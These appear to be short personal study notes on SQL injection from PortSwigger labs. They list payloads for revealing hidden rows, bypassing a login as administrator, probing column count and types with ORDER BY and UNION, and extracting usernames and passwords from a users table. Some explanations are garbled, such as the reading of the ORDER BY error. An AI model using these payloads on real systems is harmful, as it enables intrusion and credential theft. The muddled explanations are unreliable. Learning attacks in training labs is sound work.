SQL INJECTION - Portswigger Notes
-----------------



#### 1. To find hidden data

```
' OR 1=1--
```



#### 2. Login bypass

```
administrator'--
```





## Using UNION

#### 1. To find no. of cols:

```
' UNION select NULL,NULL,NULL--
```

no.of NULL's is no. of cols ->200 response



```
  ' ORDER BY 1--
```

no. determines cols. -> if shown internal error, it' correct value.





#### 2. To identify datatype of column.

```
' UNION select NULL, 'a', NULL 
```

 i) if error its not string  

ii) else its string  

iii) can be analysed by,

     `' order by 1--`





#### 3. Retrieving data from other table

need to retrieve username and password from users table.

```
'UNION select username, password from users--
```
























